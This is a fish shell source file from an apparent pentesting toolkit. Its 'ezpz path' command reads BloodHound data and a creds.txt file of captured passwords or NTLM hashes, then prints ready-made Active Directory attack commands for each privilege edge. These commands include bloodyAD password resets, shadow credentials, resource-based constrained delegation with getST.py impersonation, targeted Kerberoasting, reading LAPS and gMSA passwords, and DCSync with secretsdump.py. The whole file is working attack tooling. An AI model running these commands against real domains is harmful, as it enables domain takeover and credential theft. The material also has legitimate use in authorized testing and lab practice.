function __ezpz_path_creds --argument-names user domain
    set -l file creds.txt
    if set -q boxpwd; and test -f "$boxpwd/creds.txt"
        set file "$boxpwd/creds.txt"
    end
    test -f "$file"; or return

    while read -l line
        set line (string trim -- $line)
        test -z "$line"; and continue
        string match -q '#*' -- $line; and continue
        set -l parts (string split -m1 ':' -- $line)
        test (count $parts) -ge 2; or continue
        set -l identity $parts[1]
        set -l secret $parts[2]
        set -l item_user $identity
        set -l item_domain ""
        if string match -q '*@*' -- $identity
            set item_user (string split -m1 '@' -- $identity)[1]
            set item_domain (string split -m1 '@' -- $identity)[2]
        else if string match -rq '\\\\' -- $identity
            set item_domain (string split -m1 '\\' -- $identity)[1]
            set item_user (string split -m1 '\\' -- $identity)[2]
        end
        test (string lower -- $item_user) = (string lower -- $user); or continue
        if test -n "$domain"; and test -n "$item_domain"; and test (string lower -- $item_domain) != (string lower -- $domain)
            continue
        end
        echo $secret
        return
    end < "$file"
end

function __ezpz_path_getst --argument-names base domain user secret hash dc spn target_user
    if test -n "$hash"
        ezpz_cmd "getST.py -spn $spn -impersonate $target_user -dc-ip $dc -hashes '$hash' '$domain/$user'"
    else
        ezpz_cmd "getST.py -spn $spn -impersonate $target_user -dc-ip $dc '$domain/$user:$secret@$dc'"
    end
end

function __ezpz_path_secretsdump --argument-names domain user secret hash dc
    if test -n "$hash"
        ezpz_cmd "secretsdump.py -just-dc -dc-ip $dc -hashes '$hash' '$domain/$user@$dc'"
    else
        ezpz_cmd "secretsdump.py -just-dc -dc-ip $dc '$domain/$user:$secret@$dc'"
    end
end

function __ezpz_path_generic --argument-names base target target_type target_name user domain secret hash dc
    switch $target_type
        case User
            ezpz_info "Option 1: change password"
            ezpz_cmd "$base set password $target '<NEWPASS>'"
            ezpz_info "Option 2: shadow credentials"
            ezpz_cmd "$base add shadowCredentials $target"
        case Group
            ezpz_cmd "$base add groupMember $target $user"
        case Computer
            ezpz_info "Option 1: shadow credentials"
            ezpz_cmd "$base add shadowCredentials $target"
            ezpz_info "Option 2: RBCD + getST"
            ezpz_cmd "$base add rbcd $target $user"
            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
        case Domain
            ezpz_cmd "$base add dcsync $user"
            __ezpz_path_secretsdump "$domain" "$user" "$secret" "$hash" "$dc"
        case '*'
            printf '%s\n' "No bloodyAD template for $target_type target."
    end
end

function _ezpz_path
    source "$EZPZ_HOME/functions/_ezpz_colors.fish"
    ezpz_banner path

    set -l usage "
Usage: ezpz path -u <user> [-f <bloodhound.zip>] [-d <domain>] [-t <dc>] [-p <password> | -H <hash>]

Shows one-hop AD attack paths for a user from BloodHound data.

  -u, --user      Principal to analyze (required, alias: --from)
  -f, --file      BloodHound zip (default: newest *_bloodhound.zip)
  -z, --zip       Alias for --file
  -d, --domain    Domain used in generated commands
  -t, --target    DC IP or hostname used in generated commands
  -p, --password  Password used in generated commands
  -H, --hash      NTLM hash used in generated commands
  -h, --help      Show this help message
"

    argparse 'u/user=' 'from=' 'f/file=' 'z/zip=' 'd/domain=' 't/target=' 'p/password=' 'H/hash=' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 0
    end

    set -l source_user ""
    if set -q _flag_user
        set source_user $_flag_user
    else if set -q _flag_from
        set source_user $_flag_from
    end
    if test -z "$source_user"
        ezpz_error "Missing required argument: -u/--user"
        echo $usage
        return 1
    end

    set -l zip_file ""
    if set -q _flag_file
        set zip_file $_flag_file
    else if set -q _flag_zip
        set zip_file $_flag_zip
    else
        set zip_file (find . -maxdepth 1 -name "*_bloodhound.zip" -type f 2>/dev/null | sort | tail -1)
    end
    if test -z "$zip_file"; or not test -f "$zip_file"
        ezpz_error "BloodHound zip not found. Use -f/--file or run enumdomain first."
        return 1
    end

    set -l helper "$EZPZ_HOME/utils/bloodhound_paths.py"
    if not test -f "$helper"
        ezpz_error "BloodHound path helper not found: $helper"
        return 1
    end

    set -l records (python3 "$helper" --zip "$zip_file" --from "$source_user" 2>&1)
    set -l rc $status
    if test $rc -ne 0
        ezpz_error "$records"
        return 1
    end

    set -l source_domain ""
    set -l paths
    for record in $records
        set -l fields (string split \t -- $record)
        if test "$fields[1]" = SOURCE
            set source_domain $fields[3]
        else
            set -a paths $record
        end
    end

    set -l domain ""
    if set -q _flag_domain
        set domain $_flag_domain
    else
        set domain (string lower -- $source_domain)
    end

    set -l dc ""
    if set -q _flag_target
        set dc $_flag_target
    else
        set dc (ezpz_dc_ip $domain)
    end
    test -n "$dc"; or set dc "<DC>"

    set -l secret ""
    set -l hash ""
    if set -q _flag_hash
        set hash $_flag_hash
    else if set -q _flag_password
        set secret $_flag_password
    else
        set secret (__ezpz_path_creds "$source_user" "$domain" | head -1)
        if string match -qr '^[a-fA-F0-9]{32}$' -- "$secret"
            set hash $secret
            set secret ""
        end
    end
    test -n "$secret"; or set secret "<PASS>"
    set -l base_secret $secret
    if test -n "$hash"
        set base_secret $hash
    end

    set -l base "bloodyAD -H $dc -d $domain -u $source_user -p $base_secret"

    ezpz_header "Attack paths for $source_user"
    if test (count $paths) -eq 0
        printf '%s\n' "No attack paths found."
        echo
        ezpz_success "Done."
        return 0
    end

    for record in $paths
        set -l fields (string split \t -- $record)
        set -l edge $fields[1]
        set -l target $fields[2]
        set -l target_type $fields[3]
        set -l target_dn $fields[4]
        set -l target_name $fields[5]
        set -l via $fields[6]
        if contains -- $target_type GPO OU CertTemplate Container
            continue
        end
        set -l label "$edge: $target"
        if test -n "$via"
            set label "$label ($via)"
        end
        ezpz_info "$label"

        switch $edge
            case ForceChangePassword
                ezpz_cmd "$base set password $target '<NEWPASS>'"
            case GenericAll AllExtendedRights WriteAllProperties
                __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
            case GenericWrite
                switch $target_type
                    case User
                        ezpz_info "Option 1: shadow credentials"
                        ezpz_cmd "$base add shadowCredentials $target"
                        ezpz_info "Option 2: targeted Kerberoast"
                        if test -n "$hash"
                            ezpz_cmd "targetedkerberoast -d $domain -H '$hash' --request-user $target"
                        else
                            ezpz_cmd "targetedkerberoast -d $domain -u $source_user -p '$secret' --request-user $target"
                        end
                    case Computer
                        ezpz_info "Option 1: shadow credentials"
                        ezpz_cmd "$base add shadowCredentials $target"
                        ezpz_info "Option 2: RBCD + getST"
                        ezpz_cmd "$base add rbcd $target $source_user"
                        __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
                    case '*'
                        printf '%s\n' "No bloodyAD template for GenericWrite on $target_type target."
                end
            case WriteDacl
                if test "$target_type" = Domain
                    ezpz_cmd "$base add dcsync $source_user"
                    __ezpz_path_secretsdump "$domain" "$source_user" "$secret" "$hash" "$dc"
                else
                    ezpz_info "Step 1: grant GenericAll"
                    ezpz_cmd "$base add genericAll $target $source_user"
                    ezpz_info "Step 2: exploit GenericAll"
                    __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
                end
            case WriteOwner Owns
                ezpz_info "Step 1: take ownership"
                ezpz_cmd "$base set owner $target $source_user"
                ezpz_info "Step 2: grant GenericAll"
                ezpz_cmd "$base add genericAll $target $source_user"
                ezpz_info "Step 3: exploit GenericAll"
                __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
            case AddMember AddSelf
                ezpz_cmd "$base add groupMember $target $source_user"
            case DCSync GetChangesAll
                __ezpz_path_secretsdump "$domain" "$source_user" "$secret" "$hash" "$dc"
            case AddKeyCredentialLink
                ezpz_cmd "$base add shadowCredentials $target"
            case ReadLAPSPassword
                ezpz_cmd "$base get object $target --attr ms-Mcs-AdmPwd"
            case ReadGMSAPassword
                ezpz_cmd "$base get object $target --attr msDS-ManagedPassword"
            case AllowedToAct
                ezpz_info "Step 1: configure RBCD"
                ezpz_cmd "$base add rbcd $target $source_user"
                ezpz_info "Step 2: request service ticket"
                __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
            case AllowedToDelegate
                __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "$target" "<IMPERSONATED_USER>"
            case '*'
                continue
        end
    end

    echo
    ezpz_success "Done."
end
